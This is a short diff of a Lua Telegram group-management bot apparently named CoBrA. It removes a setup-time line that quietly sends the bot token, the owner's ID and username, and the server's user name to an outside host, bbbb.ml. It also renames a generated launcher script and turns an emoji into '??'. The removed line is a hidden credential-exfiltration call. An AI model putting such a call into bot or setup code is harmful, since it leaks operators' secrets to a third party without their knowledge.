@@ -70,7 +70,6 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('http://bbbb.ml/CoBrA/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("CoBrA", "w")  
 file:write([[
@@ -99,7 +98,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("BK", "w")  
+file = io.open("CA", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/CoBrA
@@ -5380,7 +5379,7 @@ texts = usertext..status
 send(msg.chat_id_, msg.id_, texts)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
 else
-send(msg.chat_id_, msg.id_, '܁あ┆لايوجد حساب بهذا المعرف  🎲 ܰ')
+send(msg.chat_id_, msg.id_, '܁あ┆لايوجد حساب بهذا المعرف  ?? ܰ')
 end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
